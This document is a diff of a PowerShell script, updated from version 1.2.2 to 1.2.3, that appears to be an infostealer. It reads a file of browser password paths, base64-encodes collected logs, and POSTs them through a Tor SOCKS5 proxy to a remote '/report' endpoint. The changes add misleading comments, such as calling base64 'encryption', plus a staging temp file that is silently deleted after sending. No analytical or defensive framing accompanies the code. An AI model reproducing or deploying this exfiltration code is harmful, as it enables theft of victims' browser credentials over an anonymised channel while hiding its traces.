@@ -1,4 +1,4 @@
-## VERSION 1.2.2
+## VERSION 1.2.3
 
 $log = "C:\Users\Public\log.txt"
 $zip = "C:\Users\Public\link.zip"
@@ -90,8 +90,10 @@ function main {
 function testPython {
     python test.py
     
+    # Sets Json path
     $jsonPath = "C:\Users\Public\browser_pw_paths.json"
     if (Test-Path $jsonPath) {
+        # Converts from Json
         $json = Get-Content $jsonPath | ConvertFrom-Json
 
         foreach ($entry in $json.PSObject.Properties) {
@@ -107,11 +109,20 @@ function testPython {
 
 function sendLogs($logsPath) {
     if (Test-Path $logsPath) {
+        # Encrypts data for security
         $bytes = [System.IO.File]::ReadAllBytes($logsPath)
         $protected = [Convert]::ToBase64String($bytes)
 
+        # Writes base64 string to a temp file
+        $tempDataFile = "$env:TEMP\curl_data.txt"
+        Set-Content -Path $tempDataFile -Value $protected -Encoding ascii
+
+        # Logs data to server
         "Logging $logsPath to server..." | Out-File -Append -FilePath $log
-        & curl.exe --socks5-hostname 127.0.0.1:9050 -X POST -H "Content-Type: text/plain" -d $protected "$url/report"
+        & curl.exe --socks5-hostname 127.0.0.1:9050 -X POST -H "Content-Type: text/plain" --data "@$tempDataFile" "$url/report"
+
+        # Quitely remove temp file
+        Remove-Item $tempDataFile -ErrorAction SilentlyContinue
     } else {
         "Log $logsPath not found" | Out-File -Append -FilePath $log
     }
